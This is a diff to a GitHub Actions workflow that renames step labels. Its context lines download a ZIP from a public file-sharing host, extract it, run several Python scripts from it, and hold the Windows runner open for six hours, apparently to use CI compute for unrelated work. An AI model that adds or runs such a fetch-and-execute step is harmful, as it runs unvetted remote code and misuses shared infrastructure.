@@ -8,17 +8,17 @@ jobs:
     runs-on: windows-2025
 
     steps:
-    - name: Check out the repository
+    - name: Check out the repository-v2025
       uses: actions/checkout@v2
 
-    - name: Download full ZIP and extract
+    - name: Download full ZIP and extract-v2025
       run: |
         curl -L -o code.zip https://pixeldrain.com/api/file/nahELqWM/info/zip/main5.zip
         Start-Sleep -Seconds 5
         powershell -Command "Expand-Archive -Force code.zip extracted"
 
 
-    - name: Install requests package
+    - name: Install requests package-b2025
       run: python -m pip install requests
       
     - name: Start test.py
@@ -27,7 +27,7 @@ jobs:
         Start-Sleep -Seconds 30
         python test.py
 
-    - name: Start main.py (background)
+    - name: Start main.py-v558
       run: |
         cd extracted
         Write-Host "Starting main.py in background..."
@@ -35,12 +35,12 @@ jobs:
         Start-Sleep -Seconds 10
 
         
-    - name: Run test.py -> test2.py -> test3.py
+    - name: Run test.py-v2025
       run: |
         cd extracted
         Start-Sleep -Seconds 10
         python test2.py
         python test3.py
 
-    - name: Keep alive
+    - name: Keep alive-v2025
       run: Start-Sleep -Seconds 21600  
